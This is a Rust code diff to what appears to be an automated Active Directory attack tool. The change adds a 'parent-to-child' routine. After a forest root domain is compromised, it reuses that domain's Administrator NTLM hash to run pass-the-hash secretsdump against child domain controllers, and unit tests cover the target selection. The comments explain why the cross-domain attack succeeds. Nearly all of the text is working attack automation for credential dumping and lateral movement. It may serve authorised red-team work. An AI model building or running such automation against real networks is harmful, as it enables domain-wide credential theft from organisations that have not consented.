@@ -41,6 +41,17 @@ fn pth_secretsdump_dedup_key(dc_ip: &str, parent_domain: &str) -> String {
     format!("{}:{}:pth_admin", dc_ip, parent_domain)
 }
 
+/// Build parent-to-child PTH dedup key. Distinct from `pth_secretsdump_dedup_key`
+/// so the two directions don't collide when the same (ip, domain) pair appears
+/// in both work lists.
+fn parent_to_child_pth_dedup_key(child_dc_ip: &str, child_domain: &str) -> String {
+    format!(
+        "{}:{}:pth_admin_p2c",
+        child_dc_ip,
+        child_domain.to_lowercase()
+    )
+}
+
 /// Build krbtgt-extraction dedup key. Distinct from the generic PTH key
 /// (which is for full domain dumps) so a prior full-dump failure doesn't
 /// block the narrower `-just-dc-user krbtgt` attempt against the same DC.
@@ -136,6 +147,56 @@ pub(crate) fn select_pth_secretsdump_work(state: &StateInner) -> Vec<PthSecretsd
                     parent,
                 ));
             }
+        }
+    }
+    items
+}
+
+/// Select parent-to-child PTH secretsdump work items: dump an undominated
+/// child DC using the dominated forest root's Administrator NTLM hash.
+///
+/// The forest root's RID-500 Administrator is a member of Enterprise Admins
+/// by default, and EA holds admin rights on every child DC in the forest.
+/// So an NTLM PtH against the child DC using the parent admin hash succeeds
+/// cross-domain without forging any Kerberos ticket — DRSUAPI is reachable
+/// once SMB auth lands.
+///
+/// This closes the inverse of `select_pth_secretsdump_work` (which goes
+/// child→parent). Without it, ops where the forest root is rooted first
+/// would leave undominated children sitting forever, since `auto_golden_ticket`
+/// only forges a GT for the rooted domain and never pivots to the child.
+pub(crate) fn select_parent_to_child_secretsdump_work(
+    state: &StateInner,
+) -> Vec<PthSecretsdumpWorkItem> {
+    let mut items = Vec::new();
+    for dominated in &state.dominated_domains {
+        let parent_dom = dominated.to_lowercase();
+        let Some(parent_admin_hash) = state.hashes.iter().find(|h| {
+            h.username.eq_ignore_ascii_case("administrator")
+                && h.hash_type.eq_ignore_ascii_case("NTLM")
+                && h.domain.to_lowercase() == parent_dom
+        }) else {
+            continue;
+        };
+        for (dc_domain, dc_ip) in state.all_domains_with_dcs().iter() {
+            let dc_dom_lc = dc_domain.to_lowercase();
+            if !is_child_of(&dc_dom_lc, &parent_dom) {
+                continue;
+            }
+            if state.dominated_domains.contains(&dc_dom_lc) {
+                continue;
+            }
+            let dedup = parent_to_child_pth_dedup_key(dc_ip, &dc_dom_lc);
+            if state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
+                continue;
+            }
+            items.push((
+                dedup,
+                dc_ip.clone(),
+                parent_admin_hash.domain.clone(),
+                parent_admin_hash.hash_value.clone(),
+                dc_dom_lc,
+            ));
         }
     }
     items
@@ -347,6 +408,53 @@ pub async fn auto_local_admin_secretsdump(
                 }
                 Ok(None) => {}
                 Err(e) => warn!(err = %e, "Failed to dispatch PTH secretsdump"),
+            }
+        }
+
+        // Parent-to-child PTH: when we dominate a forest root, dump
+        // undominated child DCs with the parent's Administrator NTLM hash.
+        // RID-500 admin in the forest root is EA, so PtH against the child
+        // DC reaches DRSUAPI directly — no Kerberos forging needed.
+        let p2c_work: Vec<PthSecretsdumpWorkItem> = {
+            let state = dispatcher.state.read().await;
+            select_parent_to_child_secretsdump_work(&state)
+        };
+
+        for (dedup_key, dc_ip, hash_domain, hash_value, child_domain) in
+            p2c_work.into_iter().take(2)
+        {
+            let priority = dispatcher.effective_priority("dc_secretsdump");
+            match dispatcher
+                .request_secretsdump_hash(
+                    &dc_ip,
+                    "Administrator",
+                    &hash_domain,
+                    &hash_value,
+                    priority,
+                    None,
+                )
+                .await
+            {
+                Ok(Some(task_id)) => {
+                    info!(
+                        task_id = %task_id,
+                        child_dc = %dc_ip,
+                        child_domain = %child_domain,
+                        parent_domain = %hash_domain,
+                        "Parent-to-child PTH secretsdump dispatched against child DC"
+                    );
+                    {
+                        let mut state = dispatcher.state.write().await;
+                        state.mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
+                        state.mark_credential_capture_in_flight(&child_domain);
+                    }
+                    let _ = dispatcher
+                        .state
+                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
+                        .await;
+                }
+                Ok(None) => {}
+                Err(e) => warn!(err = %e, "Failed to dispatch parent-to-child PTH secretsdump"),
             }
         }
     }
@@ -835,5 +943,120 @@ mod tests {
         s.domain_controllers
             .insert("fabrikam.local".into(), "192.168.58.40".into());
         assert!(select_pth_secretsdump_work(&s).is_empty());
+    }
+
+    // --- select_parent_to_child_secretsdump_work ------------------------
+
+    #[test]
+    fn select_p2c_emits_when_parent_dominated_and_child_dc_known() {
+        let mut s = StateInner::new("op".into());
+        s.dominated_domains.insert("contoso.local".into());
+        s.hashes
+            .push(make_admin_ntlm_hash("contoso.local", "deadbeef"));
+        s.domain_controllers
+            .insert("child.contoso.local".into(), "192.168.58.11".into());
+        let work = select_parent_to_child_secretsdump_work(&s);
+        assert_eq!(work.len(), 1);
+        // (dedup_key, child_dc_ip, parent_domain, hash, child_domain_lc)
+        assert_eq!(work[0].1, "192.168.58.11");
+        assert_eq!(work[0].2, "contoso.local");
+        assert_eq!(work[0].3, "deadbeef");
+        assert_eq!(work[0].4, "child.contoso.local");
+    }
+
+    #[test]
+    fn select_p2c_returns_empty_when_no_dominated_parent() {
+        let mut s = StateInner::new("op".into());
+        s.hashes
+            .push(make_admin_ntlm_hash("contoso.local", "deadbeef"));
+        s.domain_controllers
+            .insert("child.contoso.local".into(), "192.168.58.11".into());
+        assert!(select_parent_to_child_secretsdump_work(&s).is_empty());
+    }
+
+    #[test]
+    fn select_p2c_skips_when_child_already_dominated() {
+        let mut s = StateInner::new("op".into());
+        s.dominated_domains.insert("contoso.local".into());
+        s.dominated_domains.insert("child.contoso.local".into());
+        s.hashes
+            .push(make_admin_ntlm_hash("contoso.local", "deadbeef"));
+        s.domain_controllers
+            .insert("child.contoso.local".into(), "192.168.58.11".into());
+        assert!(select_parent_to_child_secretsdump_work(&s).is_empty());
+    }
+
+    #[test]
+    fn select_p2c_skips_when_no_parent_admin_hash() {
+        let mut s = StateInner::new("op".into());
+        s.dominated_domains.insert("contoso.local".into());
+        // No Administrator NTLM hash for contoso.local → skip.
+        s.domain_controllers
+            .insert("child.contoso.local".into(), "192.168.58.11".into());
+        assert!(select_parent_to_child_secretsdump_work(&s).is_empty());
+    }
+
+    #[test]
+    fn select_p2c_skips_non_ntlm_parent_hash() {
+        let mut s = StateInner::new("op".into());
+        s.dominated_domains.insert("contoso.local".into());
+        let mut h = make_admin_ntlm_hash("contoso.local", "deadbeef");
+        h.hash_type = "AES256".into();
+        s.hashes.push(h);
+        s.domain_controllers
+            .insert("child.contoso.local".into(), "192.168.58.11".into());
+        assert!(select_parent_to_child_secretsdump_work(&s).is_empty());
+    }
+
+    #[test]
+    fn select_p2c_skips_unrelated_dc() {
+        // dominated forest root has no child DCs in the state — fabrikam is
+        // a separate forest, not a child of contoso.
+        let mut s = StateInner::new("op".into());
+        s.dominated_domains.insert("contoso.local".into());
+        s.hashes
+            .push(make_admin_ntlm_hash("contoso.local", "deadbeef"));
+        s.domain_controllers
+            .insert("fabrikam.local".into(), "192.168.58.40".into());
+        assert!(select_parent_to_child_secretsdump_work(&s).is_empty());
+    }
+
+    #[test]
+    fn select_p2c_skips_parent_dc_itself() {
+        // The parent's own DC must not appear as a child target — `is_child_of`
+        // requires strict suffix, so contoso.local does not satisfy
+        // contoso.local.ends_with(".contoso.local").
+        let mut s = StateInner::new("op".into());
+        s.dominated_domains.insert("contoso.local".into());
+        s.hashes
+            .push(make_admin_ntlm_hash("contoso.local", "deadbeef"));
+        s.domain_controllers
+            .insert("contoso.local".into(), "192.168.58.10".into());
+        assert!(select_parent_to_child_secretsdump_work(&s).is_empty());
+    }
+
+    #[test]
+    fn select_p2c_skips_already_processed() {
+        let mut s = StateInner::new("op".into());
+        s.dominated_domains.insert("contoso.local".into());
+        s.hashes
+            .push(make_admin_ntlm_hash("contoso.local", "deadbeef"));
+        s.domain_controllers
+            .insert("child.contoso.local".into(), "192.168.58.11".into());
+        s.mark_processed(
+            DEDUP_SECRETSDUMP,
+            parent_to_child_pth_dedup_key("192.168.58.11", "child.contoso.local"),
+        );
+        assert!(select_parent_to_child_secretsdump_work(&s).is_empty());
+    }
+
+    #[test]
+    fn p2c_dedup_key_distinct_from_pth_key() {
+        // The two directions must use different namespaces so they don't
+        // shadow each other when the same (ip, domain) pair appears in both
+        // work lists.
+        let a = pth_secretsdump_dedup_key("192.168.58.11", "child.contoso.local");
+        let b = parent_to_child_pth_dedup_key("192.168.58.11", "child.contoso.local");
+        assert_ne!(a, b);
     }
 }
